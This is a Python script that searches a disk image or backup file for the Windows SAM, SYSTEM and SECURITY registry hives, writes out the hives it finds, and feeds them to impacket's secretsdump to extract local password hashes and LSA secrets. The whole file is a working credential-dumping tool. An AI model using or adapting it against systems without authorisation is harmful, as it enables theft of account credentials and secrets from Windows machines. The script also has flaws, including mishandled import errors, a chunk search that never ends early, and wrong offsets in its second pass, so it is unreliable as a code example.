#!/usr/bin/env python3

import re, os, sys, hexdump, uuid

SAM_pattern		= b"\\\x00S\x00y\x00s\x00t\x00e\x00m\x00R\x00o\x00o\x00t\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x003\x002\x00\\\x00C\x00o\x00n\x00f\x00i\x00g\x00\\\x00S\x00A\x00M"
SYSTEM_pattern		= b"\x00S\x00Y\x00S\x00T\x00E\x00M\x00\x00\x00\x00\x00"
SECURITY_pattern	= b"e\x00m\x00R\x00o\x00o\x00t\x00\\\x00S\x00y\x00s\x00t\x00e\x00m\x003\x002\x00\\\x00C\x00o\x00n\x00f\x00i\x00g\x00\\\x00S\x00E\x00C\x00U\x00R\x00I\x00T\x00Y"

SAM_filenames		= []
SYSTEM_filenames	= []
SECURITY_filenames	= []

#	 SAM, SYSTEM, SECURITY
found = [False, False, False]

if (len(sys.argv) < 2):
	print("Please provide a filename to run on")

filename = sys.argv[1]

f = open(filename, 'rb')
f_size = os.stat(filename).st_size


def autodump():
	# no need to keep scanning as we found all three
	# check which reg hives are valid by trying to import secretsdump or pypykatz
	# if none are installed, output commands to do so
	try:
		from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
		print("impacket is installed, trying to autodump SAM and LSA Secrets using secretsdump...")
		for system in SYSTEM_filenames:
			for sam in SAM_filenames:
				for security in SECURITY_filenames:
					localOperations = LocalOperations(system)
					bootKey = localOperations.getBootKey()
					__SAMHashes = SAMHashes(sam, bootKey, isRemote=False)
					print("")
					__SAMHashes.dump()
					print("")
					__LSASecrets = LSASecrets(security, bootKey, None, isRemote=False, history=False)
					__LSASecrets.dumpSecrets()
	except NameError:
		print("impacket not installed")
		print("Not able to auto parse hives using existing tools. Please install one or manually test the registry hives.")
	except:
		pass
	sys.exit(0)


def search_chunk(chunk, chunk_num, chunk_size):
	temp_SAM = chunk.find(SAM_pattern)
	temp_SYSTEM = chunk.find(SYSTEM_pattern)
	temp_SECURITY = chunk.find(SECURITY_pattern)

	if (temp_SAM > -1):
		# potential SAM found
		# print(hexdump.hexdump(chunk[temp_SAM - 0x30 : temp_SAM + len(SAM_pattern)]))
		if (b"regf" in chunk[temp_SAM - 0x30 : temp_SAM - 0x30 + 0x4]):
			tmp_name = str(uuid.uuid4()) + "_SAM"
			SAM_filenames.append(tmp_name)
			print("Potentially found SAM at offset {} within searched chunk {}. Writing to {}".format(temp_SAM, chunk_num, tmp_name))
			with open(tmp_name, "wb") as SAM:
				g = open(filename, 'rb')
				g.seek(((chunk_num - 1) * chunk_size) + (temp_SAM - 0x30))
				# 16MB is supposedly max size of registry hives on disk; impacket doesn't seem to have a problem with extra data at the end of the registry hives.
				SAM.write(g.read(min(f_size, 2800000)))
				g.close()
			found[0] = True
	if (temp_SYSTEM > -1):
		# potential SYSTEM found; 0x2F since we search by \x00S to rule out false positives
		# print(hexdump.hexdump(chunk[temp_SYSTEM - 0x2F : temp_SYSTEM + len(SYSTEM_pattern)]))
		if (b"regf" in chunk[temp_SYSTEM - 0x2F : temp_SYSTEM - 0x2F + 0x4 ]):
			tmp_name = str(uuid.uuid4()) + "_SYSTEM"
			SYSTEM_filenames.append(tmp_name)
			print("Potentially found SYSTEM at offset {} within searched chunk {}. Writing to {}".format(temp_SYSTEM, chunk_num, tmp_name))
			with open(tmp_name, "wb") as SYSTEM:
				g = open(filename, 'rb')
				g.seek(((chunk_num - 1) * chunk_size) + (temp_SYSTEM - 0x2F))
				# 16MB is supposedly max size of registry hives on disk; impacket doesn't seem to have a problem with extra data at the end of the registry hives.
				SYSTEM.write(g.read(min(f_size, 16000000)))
				g.close()
			found[1] = True
	if (temp_SECURITY > -1):
		# potential SYSTEM found
		# print(hexdump.hexdump(chunk[temp_SECURITY - 0x30 : temp_SECURITY + len(SECURITY_pattern)]))
		if (b"regf" in chunk[temp_SECURITY - 0x30 : temp_SECURITY - 0x30 + 0x4]):
			tmp_name = str(uuid.uuid4()) + "_SECURITY"
			SECURITY_filenames.append(tmp_name)
			print("Potentially found SECURITY at offset {} within searched chunk {}. Writing to {}".format(temp_SECURITY, chunk_num, tmp_name))
			with open(tmp_name, "wb") as SECURITY:
				g = open(filename, 'rb')
				g.seek(((chunk_num - 1) * chunk_size) + (temp_SECURITY - 0x30))
				# 16MB is supposedly max size of registry hives on disk; impacket doesn't seem to have a problem with extra data at the end of the registry hives.
				SECURITY.write(g.read(min(f_size, 16000000)))
				g.close()
			found[2] = True

def main():
	# reading in chunks and scanning through the chunks, if we don't find anything, maybe our chunks were too small and the pattern was at the boundry of chunks so we need to seek by chunk / 2 and scan again

	chunk_size = 4 * 1024 * 1024 # 4MiB
	start = 0
	end = chunk_size
	chunk_num = 0

	while (end < f_size):
		f.seek(start)
		chunk = f.read(chunk_size)
		chunk_num += 1
		if (search_chunk(chunk, chunk_num, chunk_size) == True):
			break
		start = end
		end += chunk_size

	# finish last partial chunk just in case
	f.seek(start)
	chunk = f.read(f_size - start)
	search_chunk(chunk, chunk_num, chunk_size)

	# shoutout to @knavesec for this monstrosity, summing across a list of bools hurts me
	if (sum(found) >= 3):
		autodump()

	# misalign and search the new chunks in case the \x00S\x00A\x00M and regf are across chunk boundries

	start = chunk_size // 2
	end = start + chunk_size
	while (end < f_size):
		f.seek(start)
		chunk = f.read(chunk_size)
		chunk_num += 1
		if (search_chunk(chunk, chunk_num, chunk_size) == True):
			break
		start = end
		end += chunk_size

main()
